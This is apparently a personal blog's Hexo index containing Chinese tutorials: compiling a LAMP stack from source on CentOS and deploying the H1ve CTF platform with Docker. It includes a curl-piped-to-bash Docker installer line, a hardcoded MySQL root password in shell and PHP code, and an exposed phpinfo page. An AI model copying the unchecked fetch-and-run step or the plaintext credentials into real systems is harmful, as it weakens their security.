src="http://img-blog.csdnimg.cn/20200401192106952.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="9-安装freetype"><a href="#9-安装freetype" class="headerlink" title="9.安装freetype"></a>9.安装freetype</h4><p>提供字体相关引擎</p><pre><code class="shell">cd /usr/src/lamp/freetype-2.3.5/./configure --prefix=/usr/local/freetypemakemake install</code></pre><h4 id="10-安装GD"><a href="#10-安装GD" class="headerlink" title="10.安装GD"></a>10.安装GD</h4><p>提供PHP图形扩展库。提供一个API。接收处理图片</p><pre><code class="shell">mkdir /usr/local/gd2cd /usr/src/lamp/gd-2.0.35vi gd_png.c./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/makemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401171607395.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200408030028184.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="4、开始安装"><a href="#4、开始安装" class="headerlink" title="4、开始安装"></a>4、开始安装</h3><h4 id="1-安装Apache"><a href="#1-安装Apache" class="headerlink" title="1.安装Apache"></a>1.安装Apache</h4><p><strong>（1）安装</strong></p><pre><code class="shell">cd /usr/src/lamp/cp -r apr-1.4.6 httpd-2.4.7/srclib/aprcp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-utilcd /usr/src/lamp/httpd-2.4.7./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate-shared --enable-expires=shared --enable-rewrite=shared</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401172910924.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行结果，缺少pcre-config，进行安装：</p><pre><code class="shell">cd /usr/src/lamp/pcre-8.34/./configuremakemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408030729266.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="shell">cd /usr/src/lamp/httpd-2.4.7./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate-shared --enable-expires=shared --enable-rewrite=sharedmakemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408034042441.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装成功<br><strong>（2）启动apache2</strong><br>1.启动apache2<br><img src="http://img-blog.csdnimg.cn/20200408034315200.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>遇到一个错误，原因：Apache安装是编译安装，安装路径不是默认路径，Apache服务没有添加到Linux服务中<br>2.解决方法：<br>1）将链接apachectl 复制到系统启动目录下并命名为httpd</p><pre><code class="shell">cp /usr/local/apache2/bin/apachectl /etc/rc.d/init.d/apache2</code></pre><p>现在就可以使用service httpd start等命令了，但在linux服务列表还没有注册<br>2）使用chkconfig来注册apache服务，并且可以在linux的服务列表中看到<code>chkconfig –list</code><br>在init.d的httpd链接文件中第2行添加如下注释：</p><pre><code class="shell">vi /etc/rc.d/init.d/apache2</code></pre><p><img src="http://img-blog.csdnimg.cn/2020040803454483.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="shell">意义:35：在3级别和5级别（级别见文末TIPS）启动apache261：启动顺序为61号，S6161：关闭顺序为61号，K61当进行chkconfig --add apache2操作时，如果没有指定level那么就会来这个注释中取值</code></pre><p>3）将httpd配置自启并加入linux服务监控</p><pre><code class="shell">chkconfig --add apache2</code></pre><p>解决方法参考：<br><a href="https://blog.csdn.net/liangdsh/article/details/78523036" target="_blank" rel="noopener">把httpd加入到service并设置启动</a><br>参考过程中只把httpd改为apache2，其他不变。<br>3.再次启动apache2</p><pre><code class="shell">service apache2 start</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408034959902.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就发现启动成功了。<br><strong>（3）测试</strong><br>1.先自己在物理机上测试访问一下<br>Centos虚拟机ip：192.168.1.33<br><img src="http://img-blog.csdnimg.cn/20200408035310314.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Apache搭建成功，也可用Centos上的elinks工具进行测试。<br>2.安装elinks</p><pre><code class="shell">yum -y install elinks</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408141742568.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试一下</p><pre><code class="shell">elinks 192.168.1.33</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408142154309.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试成功。</p><h4 id="2-安装MySQL"><a href="#2-安装MySQL" class="headerlink" title="2.安装MySQL"></a>2.安装MySQL</h4><p><strong>（1）安装</strong></p><pre><code class="shell">yum -y install cmakeyum -y install bison #语法解释器</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408143418337.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>（2）建立mysql用户并安装mysql</strong></p><pre><code class="shell">useradd mysql#查看id mysqlcd /usr/src/lamp/mysql-5.5.23/[root@qwzf mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \&gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \&gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \&gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \&gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \&gt; -DMYSQL_TCP_PORT=3306</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408145453375.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现报错：<br><img src="http://img-blog.csdnimg.cn/20200408145801948.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解决方法：</p><pre><code class="shell">yum -y install ncurses-develcd /usr/src/lamp/ncurses-5.9/./configure --with-shared --without-debug --with-ada --enable-overwritemakemake installcd ..rm -rf mysql-5.5.23 #删掉原来的目录tar -zxf mysql-5.5.23.tar.gz #再次解压</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408150828619.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200408151255219.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后重新编译安装mysql<br><img src="http://img-blog.csdnimg.cn/20200408151725823.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装成功，然后</p><pre><code class="shell">makemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408152617730.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>（3）进入mysql目录更改权限</strong></p><pre><code class="shell">cd /usr/local/mysqlchown -R mysql:mysql . #改属主/usr/local/mysql/scripts/mysql_install_db --user=mysql #数据库初始化</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408153012347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>初始化成功，授权表和库的权限</p><pre><code class="shell">chown -R root .chown -R mysql data/cp support-files/my-medium.cnf /etc/my.cnf #复制配置文件</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408153354543.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>（4）开启MySQL并查看</strong></p><pre><code class="shell">/usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408153737791.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现开启失败。杀死mysql的进程，再初始化数据库，然后启动</p><pre><code class="shell">ps aux | grep mysql/usr/local/mysql/scripts/mysql_install_db --user=mysql/usr/local/mysql/bin/mysqld_safe --user=mysqlnetstat -anpt</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408154616994.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现3306端口已经打开，数据库已经启动<br>添加mysql开机自启</p><pre><code class="shell">vim /etc/rc.d/rc.local</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408155032563.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>（5）登陆mysql并设置密码</strong><br>登录mysql</p><pre><code class="shell">/usr/local/mysql/bin/mysql</code></pre><p><img src="http://img-blog.csdnimg.cn/202004081553445.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置密码，然后登录mysql</p><pre><code class="shell">/usr/local/mysql/bin/mysqladmin -u root password &#39;wmm123&#39;/usr/local/mysql/bin/mysql -u root -p</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408155614343.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如果退出要删除history，因为会记录设置的密码</p><pre><code class="shell">history -c</code></pre><p>至此，MySQL安装测试成功。</p><h4 id="3-安装PHP"><a href="#3-安装PHP" class="headerlink" title="3.安装PHP"></a>3.安装PHP</h4><p><strong>（1）先安装上预先准备好的环境</strong></p><pre><code class="shell">yum -y install libtool*</code></pre><p><strong>（2）修改配置文件以支持数据库的内容</strong></p><pre><code class="shell">vim /usr/local/gd2/include/gd_io.h</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408160905461.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加上这一行代码(为了使php读到数据库内容)，保存退出<br><strong>（3）安装php</strong></p><pre><code class="shell">cd /usr/src/lamp/php-5.4.25/#指定之前安装过的软件路径[root@qwzf php-5.4.25]# ./configure --prefix=/usr/local/php/ \&gt; --with-config-file-path=/usr/local/php/etc/ \&gt; --with-apxs2=/usr/local/apache2/bin/apxs \&gt; --with-mysql=/usr/local/mysql \&gt; --with-libxml-dir=/usr/local/libxml2 \&gt; --with-jpeg-dir=/usr/local/jpeg6/ \&gt; --with-png-dir=/usr/local/libpng/ \&gt; --with-freetype-dir=/usr/local/freetype/ \&gt; --with-gd=/usr/local/gd2/ \&gt; --with-mcrypt=/usr/local/libmcrypt/ \&gt; --with-mysqli=/usr/local/mysql/bin/mysql_config \&gt; --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408162006897.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行成功，然后</p><pre><code class="shell">makemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408162547515.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200408162738992.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码编译安装成功，然后配置文件<br>创建存放配置文件的目录并复制一下主配置文件</p><pre><code class="shell">mkdir /usr/local/php/etccp php.ini-production /usr/local/php/etc/php.ini</code></pre><p>添加指定的那一行，保存退出</p><pre><code class="shell">vi /usr/local/apache2/etc/httpd.conf</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408164150495.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重启Apache</p><pre><code class="shell">/usr/local/apache2/bin/apachectl stop/usr/local/apache2/bin/apachectl start#/usr/local/apache2/bin/apachectl restart</code></pre><p>好了，到这里Apache、MySQL和PHP安装成功。下面进行测试</p><h3 id="5、进行测试"><a href="#5、进行测试" class="headerlink" title="5、进行测试"></a>5、进行测试</h3><h4 id="1-Apache与PHP"><a href="#1-Apache与PHP" class="headerlink" title="1.Apache与PHP"></a>1.Apache与PHP</h4><p>在/usr/local/apache2/htdocs/目录下创建一个index.php<br>写入PHP代码，这里直接写个查看phpinfo信息的：</p><pre><code class="php">&lt;?php  phpinfo();?&gt;</code></pre><p>物理机上进行访问<br><img src="http://img-blog.csdnimg.cn/20200408171123389.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试成功，说明Apache能与PHP一起工作</p><h4 id="2-Apache与MySQL"><a href="#2-Apache与MySQL" class="headerlink" title="2.Apache与MySQL"></a>2.Apache与MySQL</h4><p>写一个qwzf.php，内容如下：</p><pre><code class="php">&lt;?php$link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;wmm123&#39;);if($link) echo &quot;I am wmm!!!&quot;;mysql_close();?&gt;</code></pre><p>物理机上访问<br><img src="http://img-blog.csdnimg.cn/20200408171755986.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说明MySQL能与Apache一起工作</p><h4 id="3-安装phpmyadmin"><a href="#3-安装phpmyadmin" class="headerlink" title="3.安装phpmyadmin"></a>3.安装phpmyadmin</h4><p>为了方便数据库管理，可以安装一下phpmyadmin</p><pre><code class="shell">cd /usr/src/lamp/cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre><p>进入phpmyadmin目录，生成配置文件</p><pre><code class="shell">cd /usr/local/apache2/htdocs/phpmyadmincp config.sample.inc.php config.inc.php #修改访问类型vim config.inc.php #将cookie改成http</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408172435640.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2020040817244570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问phpmyadmin，输入mysql用户和密码，看到如下界面<br><img src="http://img-blog.csdnimg.cn/20200408172630792.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到此，LAMP环境完全搭建成功。</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>了解了源码安装的整个过程，又增强了自己解决报错的能力。</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Linux网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章带你搭建CTF平台-基于CTFd的H1ve</title>
      <link href="/2020/04/01/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0-%E5%9F%BA%E4%BA%8ECTFd%E7%9A%84H1ve/"/>
      <url>/2020/04/01/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0-%E5%9F%BA%E4%BA%8ECTFd%E7%9A%84H1ve/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间发现了一个界面精美的CTF平台-H1ve，发现它是在CTFd的基础上进行美化的。然后，我们团队的lemon搭建了一下，由于某些原因不能用了(服务器到期)。于是我参考其搭建笔记又搭了一遍，发现了几个新的问题。继续总结一下搭建过程及所可能遇到的问题吧。。。</p><h2 id="0x00-搭建环境"><a href="#0x00-搭建环境" class="headerlink" title="0x00 搭建环境"></a>0x00 搭建环境</h2><blockquote><p>Centos 7 64位(其他版本暂未测试)<br>Docker<br>python2.7</p></blockquote><h2 id="0x01-搭建流程"><a href="#0x01-搭建流程" class="headerlink" title="0x01 搭建流程"></a>0x01 搭建流程</h2><h3 id="1、服务器"><a href="#1、服务器" class="headerlink" title="1、服务器"></a>1、服务器</h3><p>准备一个云服务器，阿里云、腾讯云和华为云均可。镜像选择Centos 7.x 64位的，只要是Centos 7 64位就行，具体版本无所谓。</p><h3 id="2、安装docker"><a href="#2、安装docker" class="headerlink" title="2、安装docker"></a>2、安装docker</h3><p><strong>1.安装所需软件包</strong></p><pre><code class="shell">sudo yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</code></pre><p><strong>2.设置yum源</strong></p><pre><code class="shell">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</code></pre><p>设置yum源主要是提高yum下载速度<br><strong>3.安装docker</strong></p><pre><code class="shell">sudo yum install docker-ce</code></pre><p>如果安装失败，可采用下面的脚本脚本安装</p><pre><code class="shell">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></pre><p><strong>4.启动并加入开机启动</strong></p><pre><code class="shell">sudo systemctl start docker #或sudo service docker startsudo systemctl enable docker</code></pre><p><strong>5.验证是否安装成功</strong></p><pre><code class="shell">docker version</code></pre><p><img src="http://img-blog.csdnimg.cn/20200331203433402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="3、安装docker-compose"><a href="#3、安装docker-compose" class="headerlink" title="3、安装docker-compose"></a>3、安装docker-compose</h3><p><strong>1.安装epel-release</strong></p><pre><code class="shell">yum -y install epel-release</code></pre><p><strong>2.安装python-pip</strong></p><pre><code class="shell">yum -y install python-pip</code></pre><p>如果出现<code>未找到匹配的参数: python-pip 错误:没有任何匹配: python-pip</code><br>（1）可能原因：<br>Centos中有的源是被禁用的，通过以下命令可以查看启用的源和禁用的源。</p><pre><code class="shell">#查看启用的源列表yum repolist#查看禁用的源列表yum repolist disabled</code></pre><p>查看之后，发现epel在禁用列表里。<br>（2）修复方法：<br>启用的方法：</p><pre><code class="shell">vi /etc/yum.repos.d/epel.repo</code></pre><p>将第一个和第三个的enabled=0改成enabled=1，第二个是测试版的可能不稳定所有别修改。<br>修改后就可以安装<code>python-pip</code>了。<br>也可参考：<br><a href="https://blog.csdn.net/herobacking/article/details/80276052" target="_blank" rel="noopener">CentOS下使用yum安装python-pip失败的完美解决方法</a><br><strong>3.升级pip</strong></p><pre><code class="shell">pip install --upgrade pip</code></pre><p>如果出现<code>ModuleNotFoundError: No module named &#39;pip._internal&#39;</code><br>（1）可能原因：<br>与旧版冲突导致了这个报错。<br>（2）修复方法：</p><pre><code class="shell">python -m ensurepippython -m pip install --upgrade pip</code></pre><p>更多修复方法参考：<br><a href="https://blog.csdn.net/wangweiwells/article/details/88374070?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">ModuleNotFoundError: No module named ‘pip._internal’ , pip 无法下载软件 解决办法</a><br><strong>4.安装docker-compose</strong></p><pre><code class="shell">pip install docker-compose</code></pre><p>如果出现<code>ReadTimeoutError: httpConnectionPool(host=&#39;pypi.python.org&#39;, port=443): Read timed out</code><br>（1）可能原因：(暂时我不知道)<br>（2）修复方法：</p><pre><code class="shell">pip --default-timeout=200 install -U docker-compose</code></pre><p>如果出现<br><img src="http://img-blog.csdnimg.cn/20200225225907389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由于忘了截图了，上边都没有配图。但这个发现我们团队的lemon截图了，于是拿来即用。<br>（1）可能原因：<br>缺少openssl-devel支持<br>（2）修复方法：</p><pre><code class="shell">yum install gcc libffi-devel python-devel openssl-devel -y</code></pre><p>也可参考：<a href="https://www.laozuo.org/10700.html" target="_blank" rel="noopener">解决”command ‘gcc’ failed with exit status 1”错误问题</a></p><p>然后重新使用pip安装docker-compose</p><pre><code class="shell">pip install docker-compose</code></pre><p><strong>5.验证是否安装成功</strong></p><pre><code class="shell">docker-compose version</code></pre><p>如果出现<code>/usr/lib/python2.7/site-packages/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.25.8) or chardet (2.2.1) doesn&#39;t match a supported version!</code><br>（1）可能原因：<br>python库中urllib3 (1.25.8) or chardet (2.2.1) 的版本不兼容<br>（2）修复方法：</p><pre><code class="shell">pip uninstall urllib3pip uninstall  chardetpip install requests</code></pre><p>如果出现<code>from backports.shutil_get_terminal_size import get_terminal_sizeImportError: No module named shutil_get_terminal_size</code><br>（1）可能原因：<br>1）未安装ipython或安装有问题(我遇到的是这个原因)<br>2）(第二个原因暂时不清楚)<br>（2）修复方法：<br>1）针对原因<code>1)</code>，可以用pip安装ipython：</p><pre><code class="shell">pip install ipython</code></pre><p>如果安装之后，还有这个错误，可使用下面这个命令：</p><pre><code class="shell">pip install --force ipython</code></pre><p>2）针对原因<code>2)</code>，报错信息显示在<code>/usr/local/lib/python2.7/dist-packages/IPython/utils/terminal.py</code>的<code>from backports.shutil_get_terminal_size import get_terminal_size as _get_terminal_size</code>出错。<br><code>sudo vi vi /usr/lib/python2.7/site-packages/IPython/utils/terminal.py</code>打开此脚本<br>将出错的代码段修改如下：<br><img src="http://img-blog.csdnimg.cn/20200331214154927.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再次输入进行测试</p><pre><code class="shell">docker-compose version</code></pre><p><img src="http://img-blog.csdnimg.cn/20200331214818164.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意：如果docker-compose版本过低，则无法启动H1ve-CTFd</p><h3 id="3、安装与启动H1ve"><a href="#3、安装与启动H1ve" class="headerlink" title="3、安装与启动H1ve"></a>3、安装与启动H1ve</h3><p><strong>开源平台地址</strong></p><pre><code class="php">https://github.com/D0g3-Lab/H1ve</code></pre><p><img src="http://img-blog.csdnimg.cn/202002260933402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt><br>看着挺精美的，那就开始安装吧！</p><h4 id="1-搭建前准备"><a href="#1-搭建前准备" class="headerlink" title="1.搭建前准备"></a>1.搭建前准备</h4><p><strong>（1）安装git</strong><br>一般情况下Centos上可能没安装<code>git</code>，从github上克隆项目需要用到这个。(当然也可以用本地自己的电脑下载好，然后上传到服务器。这样的话，就不需要安装git)<br>安装git命令：</p><pre><code class="php">yum -y install git</code></pre><p>克隆CTF平台项目源码</p><pre><code class="php">git clone https://github.com/D0g3-Lab/H1ve.git</code></pre><p><strong>（2）配置docker源为国内源</strong><br>这个主要是因为当拉取镜像时，由于远端仓库的服务器是在国外，国内用户拉取镜像的速度特别慢，或很可能都访问不了，产生报错。<br>下面有我发现的两个好用的国内docker源：<br>1）阿里云镜像加速器</p><pre><code class="php">https://(yourid).mirror.aliyuncs.com</code></pre><p>2）ustc(中国科学技术大学)</p><pre><code class="php">https://docker.mirrors.ustc.edu.cn</code></pre><p>下面是以阿里云镜像加速器为例，配置docker国内源：<br>阿里云的docker镜像加速器需要注册账号，每个人都有自己唯一的地址。<br><img src="http://img-blog.csdnimg.cn/20200331221932181.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以采用里边给定的配置docker镜像加速器的方法，也可以：<br>（1）使用vi编辑器写入/etc/docker/daemon.json</p><pre><code class="shell">vi /etc/docker/daemon.json</code></pre><p>添加下面内容：</p><pre><code class="shell">{    &quot;registry-mirrors&quot;: [&quot;https://(yourid).mirror.aliyuncs.com&quot;]}</code></pre><p>保存退出<br>（2）重启docker</p><pre><code class="shell">sudo systemctl daemon-reloadsystemctl restart docker</code></pre><h4 id="2-开始搭建H1ve"><a href="#2-开始搭建H1ve" class="headerlink" title="2.开始搭建H1ve"></a>2.开始搭建H1ve</h4><p>进到下载好的项目H1ve根目录，执行下面的命令：</p><pre><code class="shell">docker-compose -f single.yml up</code></pre><p>默认的端口是8000(可在Dockerfile文件中进行修改，尽量不要改)，访问一下服务器的IP地址，就会发现搭建成功了。<br>如果运行过程中出现<code>响应码500错误</code>，重启环境即可(暂时没发现好的方法解决)<br>在项目根目录下，重启命令：</p><pre><code class="shell">docker-compose -f single.yml downdocker-compose -f single.yml up</code></pre><h2 id="0x02-修改首页内容"><a href="#0x02-修改首页内容" class="headerlink" title="0x02 修改首页内容"></a>0x02 修改首页内容</h2><p><strong>1.修改首页信息</strong><br>即修改下面箭头所示信息：<br><img src="http://img-blog.csdnimg.cn/20200331224833180.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改方法如下：<br><img src="http://img-blog.csdnimg.cn/20200331224131370.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后修改下面这个文件即可：<br><img src="http://img-blog.csdnimg.cn/20200331224245815.jpg" alt="在这里插入图片描述"><br><strong>2.修改首页logo</strong><br>如果要换页面首页的logo的话，在服务器里找到下面这个文件替换即可：<br><img src="http://img-blog.csdnimg.cn/20200331224517571.jpg" alt="在这里插入图片描述"><br>当然我只是测试了下，不知道替换后会不会侵权，能不替换还是不要替换了。也可以替换一些其他的地方信息，但不晓得会不会侵权。我只知道如果修改后用于商业用途是一定会侵权的，不用作商业用途应该不会侵权。</p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>搭建过程中，解决报错还是挺有趣的，不仅培养了自己的解决报错的能力，而且还可以让自己产生一些思考，真的挺不错的。继续努力吧，做一个奋进的精神小火。。。</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> 服务搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建 </tag>
            
            <tag> H1ve </tag>
            
            <tag> CTFd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届BJD CTF做题总结与题目复现-Web</title>
